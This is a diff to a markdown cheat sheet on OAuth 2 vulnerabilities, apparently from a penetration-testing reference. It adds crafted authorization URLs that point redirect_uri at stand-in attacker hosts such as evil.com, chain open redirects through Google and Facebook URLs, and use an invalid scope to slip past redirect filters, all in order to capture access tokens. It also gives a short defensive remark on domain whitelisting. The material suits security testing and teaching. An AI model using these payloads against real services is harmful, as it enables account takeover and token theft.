@@ -1,12 +1,20 @@
 # OAuth 2 - Common vulnerabilities
 
 ## Grabbing OAuth Token via redirect_uri
+Redirect to a controlled domain to get the access token
 ```
 https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
-https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost
 https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
-https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
 ```
+
+Redirect to an accepted Open URL in to get the access token
+```
+https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
+https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
+```
+OAuth implementations should never whitelist entire domains, only a few URLs so that “redirect_uri” can’t be pointed to an Open Redirect.
+
+
 Sometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri:
 ```
 https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
@@ -31,3 +39,4 @@ and SHOULD revoke (when possible) all tokens previously issued based on that aut
 * http://blog.intothesymmetry.com/2016/11/all-your-paypal-tokens-belong-to-me.html
 * http://homakov.blogspot.ch/2014/02/how-i-hacked-github-again.html
 * http://intothesymmetry.blogspot.ch/2014/04/oauth-2-how-i-have-hacked-facebook.html
+* http://andrisatteka.blogspot.ch/2014/09/how-microsoft-is-giving-your-data-to.html
